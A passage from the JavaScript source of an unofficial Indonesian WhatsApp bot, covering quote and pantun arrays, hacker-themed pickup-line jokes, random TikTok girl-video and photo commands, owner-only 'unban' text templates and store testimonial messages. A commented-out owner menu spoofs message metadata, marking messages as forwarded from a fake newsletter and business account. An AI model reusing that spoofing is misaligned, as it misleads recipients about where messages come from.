  "Untuk yang pernah menyakitiku, terima kasih telah mengajarkanku arti bersabar dan semoga kamu tidak akan pernah merasakan sakit yang kurasakan.",
  "Tidak bisa dibayangkan tingkah laku dan caramu. Kemarin katanya sayang, eh, ternyata hari ini malah kau berkata sayang dia.",
  "Pengkhianatan itu ibarat lumut yang tumbuh di sela-sela bebatuan, menyelusup dan tumbuh, lalu secara perlahan menghancurkan.",
  "Ketika aku melihatmu, aku selalu berpikir wajah mana yang kamu lihat ketika bercermin.",
  "Salah satu hal yang menggelikan yang terjadi pada manusia, seseorang menyakitimu lalu dia bertingkah seolah-olah kamu yang menyakitinya.",
  "Pengkhianat berawal dari watak penjilat.Penjilat berawal dari watak penjahat.Penjahat berawal dari watak sekarat.Jadi, pengkhianat akan sekarat dunia akhirat.",
  "Aku sudah berniat menaruh hati kepadamu, tapi kamu malah mengecewakan aku terlebih dahulu."]
const gyut = lili[Math.floor(Math.random() * lili.length)]
alifatah.sendMessage(m.chat, {text: `${gyut}` }, {quoted:fcall})
}
break

case 'qpantun':
case 'quotespantun':
case 'pantun': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
const cici = ['Ada anak kecil bermain batu,\nBatu dilempar masuk ke sumur,\nBelajar itu tak kenal waktu,\nJuga tidak memandang umur. ',
'Tanam kacang di pagi hari,\nTumbuh enam layu sebatang,\nKeburukan orang jangan dicari,\nBila kalian sedang puasa. ',
'Akhir bulan mendapat gaji,\nGaji untuk membeli ketupat,\nRajin-rajinlah sholat dan mengaji,\nJanganlah lupa puasa dan zakat. ',
'Waktu daftar hari terakhir,\nWaktu terasa banyak terbuang,\nKamu nggak perlu khawatir,\ncintaku hanya untukmu seorang. ',
'Ada anak kecil bermain batu,\nBatu dilempar masuk ke sumur,\nBelajar itu tak kenal waktu,\nJuga tidak memandang umur. ',
'Seribu bebek di kandang singa,\nhanya satu berwarna belang,\nBeribu cewek di Indonesia,\nhanya engkau yang aku sayang. ',
'Hari minggu pergi ke pasar,\nBeli sayur dan juga beras,\nTiap hari harus belajar,\nPasti akan menjadi cerdas. ',
'Ayam goreng setengah mateng,\nBelinya di depan tugu.\nAbang sayang, abangku ganteng,\nlneng di sini setia menunggu. ',
'Api kecil dari tungku,\nApinya kecil habis kayu.\nSudah lama kutunggu-tunggu,\nkapan kamu bilang I love you. ',
'Seribu bebek di kandang singa,\nhanya satu berwarna belang\nBeribu cewek di Indonesia,\nhanya engkau yang aku sayang. ',
'Pergi memancing saat fajar,\nPulang siang membawa ikan\nSiapa yang rajin belajar\nJadi orang sukses kemudian. ',
'Beli computer itu biasa\nSupaya belajar jadi semangat\nMari kita belajar puasa\nAgar kita jadi kuat ',
'Minum sekoteng hangat rasanya,\nminum segelas ada yang minta.\nLaki-laki ganteng siapa yang punya?\nBolehkah aku jatuh cinta.',
'Raja gagah lagi sakti Laksamana pergi berperang Supaya tidak sesal di hati Janganlah kena perdaya orang ',
'Pergi mendaki Gunung Daik Hendak menjerat kancil dan rusa Bergotong-royong amalan yang baik Elok diamalkan setiap masa',
'Pinang muda dibelah dua Manik-manik mati dirempuh Dari muda sampai ke tua Pengajaran baik jangan diubah ',
'Tegak-tegak cocokkan pancang Pasang bendera bunyikan tabuh Agak-agak mengatai orang Supaya cedera jangan tumbuh ',
'Batang ketumbar dahan-dahan Kelapa jatuh ke tepi bangsal Biarlah sabar dengan perlahan Siapa gopoh nanti menyesal ',
'Kayu bakar dibuat arang Arang dibakar memanaskan diri Jangan mudah menyalahkan orang Cermin muka lihat sendiri ',
'Lepas di jemur baju dilipat Disimpan dalam almari lama Jangan kita tinggalkan sholat Karena sholat tiang agama',
'Ke restoran membeli makan Perginya bersama sang istri Perintah Tuhan ayo kerjakan Larangan Tuhan ayo jauhi',
'Pulau Sumatra pulau Kalimantan Pulau Bali pulau Sumba Shalat lima waktu ayo tegakkan Tiang agama nan utama',
'Membeli beras ke Mang Duloh Membeli semen ke Mang Omat Iman dan takwa kepada alifatahlah Kunci bahagia dunia akhirat',
'Beli bensin satu tangki Bensi dibeli oleh Mak Rosa Bersihkan hati dari dengki Sucikan raga dari dosa']
const gyet = cici[Math.floor(Math.random() * cici.length)]
alifatah.sendMessage(m.chat, {text: `${gyet}` }, {quoted:fcall})
}
break

case 'hacker':
case 'quoteshacker':
case 'qhacker': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
const tol = ["Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
	"Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
	"Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
	"berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
	"Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
	"Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
	"Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
	"Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
	"Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
	"Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
	"Aku deketin kamu cuma untuk redirect ke hati temenmu.",
	"Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
	"Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
	"kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
	"Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
	"Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
	"SQLI ( Structured Query Love Injection )",
	"aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
	"Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
	"kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
	"Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
	"hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
	"Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
	"Jangan men-dualboot-kan hatiku kepadamu.",
	"cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
	"KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
	"Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
	"cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"]
const hew = tol[Math.floor(Math.random() * tol.length)]
alifatah.sendMessage(m.chat, {text: `${hew}` }, {quoted:fcall})
}
break

case 'tiktokgirl':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var asupan = JSON.parse(fs.readFileSync('./V5Media/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', video: { url: ii.url }}, { quoted:fcall })
break

case 'tiktoknukhty':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var ukhty = JSON.parse(fs.readFileSync('./V5Media/tiktokvids/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', video: { url: iiiii.url }}, { quoted:fcall })
break

case 'tiktoksantuy':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var santuy = JSON.parse(fs.readFileSync('./V5Media/tiktokvids/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', video: { url: iiiiii.url }}, { quoted:fcall })
break

case 'tiktokpanrika':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var rikagusriani = JSON.parse(fs.readFileSync('./V5Media/tiktokvids/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', video: { url: iiiiiiii.url }}, { quoted:fcall })
break

case 'tiktoknotnot':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokvids/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', video: { url: iiiiiiiii.url }}, { quoted:fcall })
break

case 'tiktokghea':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var gheayubi = JSON.parse(fs.readFileSync('./V5Media/tiktokvids/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
alifatah.sendMessage(m.chat, { caption: 'don banh', video: { url: iii.url }}, { quoted:fcall })
break

case 'tiktokkayes':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var kayes = JSON.parse(fs.readFileSync('./V5Media/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', video: { url: iiiiiii.url }}, { quoted:fcall })
break

case 'tiktokbocil':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var bocil = JSON.parse(fs.readFileSync('./V5Media/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', video: { url: iiii.url }}, { quoted:fcall })
break
//=======================================================//
case 'chinese':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiii.url } }, { quoted:fcall })
break

case 'hijab':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiii.url } }, { quoted:fcall })
break

case 'indo':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiiii.url } }, { quoted:fcall })
break

case 'japanese':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiiiii.url } }, { quoted:fcall })
break
//=======================================================//
case 'korean':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiiiiii.url } }, { quoted:fcall })
break
case 'malay':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiiiiiii.url } }, { quoted:fcall })
break
case 'randomgirl':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted:fcall })
break
case 'random2':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted:fcall })
break
case 'thai':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted:fcall })
break
case 'vietnamese':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply('*Proses...‼️*')
var notnot = JSON.parse(fs.readFileSync('./V5Media/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alifatah.sendMessage(m.chat, { caption: '*Done...✅*', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted:fcall })
break
//=======================================================//
case 'textunbanv1':
if (!isCreator) return reply(mess.owner)
const vaga = ` ${textunbanv1()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(vaga)
break
case 'textunbanv2':
if (!isCreator) return reply(mess.owner)
const aga = ` ${textunbanv2()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(aga)
break
case 'textunbanv3':
if (!isCreator) return reply(mess.owner)
const naga = ` ${textunbanv3()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(naga)
break
case 'textunbanv4':
if (!isCreator) return reply(mess.owner)
const woii = ` ${textunbanv5()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(woii)
break
case 'textunbanv5':
if (!isCreator) return reply(mess.owner)
const sokasim = ` ${textunbanv5()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(sokasim)
break
//=======================================================//
case 'textunbanv6':
if (!isCreator) return reply(mess.owner)
const akakaka = ` ${textunbanv6()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(akakaka)

break
//=======================================================//
case 'textunbanv7':
if (!isCreator) return reply(mess.owner)
const kopok = ` ${textunbanv7()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(kopok)

break
//=======================================================//
case 'textunbanv8':
if (!isCreator) return reply(mess.owner)
const tehyung = ` ${textunbanv8()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(tehyung)

break
//=======================================================//
case 'textunbanv9':
if (!isCreator) return reply(mess.owner)
const ahhyan = ` ${textunbanv9()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahhyan)

break
//=======================================================//
case 'textunbanv10':
if (!isCreator) return reply(mess.owner)
const yamete = ` ${textunbanv10()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(yamete)

break
//=======================================================//
case 'textunbanv11':
if (!isCreator) return reply(mess.owner)
const suuu = ` ${textunbanv11()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(suuu)

break
//=======================================================//
case 'textunbanv12':
if (!isCreator) return reply(mess.owner)
const huuuu = ` ${textunbanv12()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(huuuu)

break
//=======================================================//
case 'textunbanv13':
if (!isCreator) return reply(mess.owner)
const gaje = ` ${textunbanv13()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(gaje)

break
//=======================================================//
case 'textunbanv14':
if (!isCreator) return reply(mess.owner)
const well = ` ${textunbanv14()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(well)

break
//=======================================================//
case 'textunbanv15':
if (!isCreator) return reply(mess.owner)
const lempo = ` ${textunbanv15()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lempo)

break
//=======================================================//
case 'textunbanv16':
if (!isCreator) return reply(mess.owner)
const cok = ` ${textunbanv16()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(cok)

break
//=======================================================//
case 'textunbanv17':
if (!isCreator) return reply(mess.owner)
const sayasuka = ` ${textunbanv17()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sayasuka)

break
//=======================================================//
case 'textunbanv18':
if (!isCreator) return reply(mess.owner)
const oooooooo= ` ${textunbanv18()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(oooooooo)

break
//=======================================================//
case 'textunbanv19':
if (!isCreator) return reply(mess.owner)
const omaaavaaaaaaaa = ` ${textunbanv19()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(omaaavaaaaaaaa)

break
//=======================================================//
case 'textunbanv20':
if (!isCreator) return reply(mess.owner)
const bykepo = ` ${textunbanv20()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(bykepo)

break
//=======================================================//
case 'textunbanv21':
if (!isCreator) return reply(mess.owner)
const unbannned = ` ${textunbanv21()}


Powered By *${global.namaown}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(unbannned)

break

case 'testi1':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 1\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_1.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi2':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 2\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_2.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi3':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 3\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_3.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi4':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 4\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_4.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi5':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 5\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_5.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi6':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 6\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_6.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi7':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 7\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_7.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi8':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 8\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_8.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi9':{
let tekssss = `**Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 9\n© Copyriht By ${global.namastore}`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_9.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'testi10':{
let tekssss = `*Selamat Datang Di Store ${global.namastore}*\n\n_Ini Adalah Testimoni Dari Store/Kokoh Kamu_\n\n_Gambar Dan Harga Bisa Cek Di Atas Ya Kak ${pushname}_\n\n_Jika Ingin Membeli Barang Silahkan Chat Owner/Admin Di Bawah_\nhttps://wa.me/${global.owner}\n\n• ᴛᴇꜱᴛɪᴍᴏɴɪ 10\n© Copyriht By ${global.namastore}
`
alifatah.sendMessage(m.chat, { image: fs.readFileSync(`./V5Moni/X4Moni_10.jpg`),
 caption: tekssss, 
footer: `${global.namastore} © 20223`},
{quoted:fcall})
}
break

/*case'owner':{
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
let text = `
* harap untuk tidak spam kepada owner
* tanyakan pada hal yang penting penting aja
* ga penting? ga di read
* bertanya gausah basa basi, langsung inti
* telpon/vc = blok

     _© Created By Fauzialifatah_`

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
"messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `_*Hai ${pushname} ini adalah Ownerku👋*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: text
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: ``,
            subtitle: text,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
{
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Owner Bot\",\"url\":\"https://wa.me/+${owner}\",\"merchant_url\":\"https://wa.me/+${owner}\"}`
              },
           ],
 })})}}}, {quoted:m})

await alifatah.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})}
break

case 'menuowner':
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
await loading()
wye = `
*Hi @${sender.split("@")[0]} 👋*
[ 🇬🇧 ] Hello, I am a WhatsApp bot built by a script developer, I am here to help you in finding various things you need via WhatsApp messenger, good luck trying

${ownerlist()}`
let msgpvi = generateWAMessageFromContent(m.chat, { 
                  viewOnceMessage: { 
                    message: { 
                        "messageContextInfo": { 
                          "deviceListMetadata": {}, 
                          "deviceListMetadataVersion": 2 
                        }, 
                        interactiveMessage: proto.Message.InteractiveMessage.create({ 
                            contextInfo: { 
                                mentionedJid: null, 
                                isForwarded: true, 
                                forwardedNewsletterMessageInfo: { 
                                    newsletterJid: 'bjir@newsletter', 
                                    newsletterName: 'Script WhatsApp V5', 
                                    serverMessageId: -1 
                                }, 
                                businessMessageForwardInfo: { 
                                    businessOwnerJid: "0@s.whatsapp.net" 
                                }, 
                                
                            }, 
                          body: proto.Message.InteractiveMessage.Body.create({ 
                            text: wye
                          }), 
                          footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: Styles (`Fauzialifatah - MD`)
                          }), 
                          header: proto.Message.InteractiveMessage.Header.create({ 
                            title: "", 
                            subtitle: "--", 
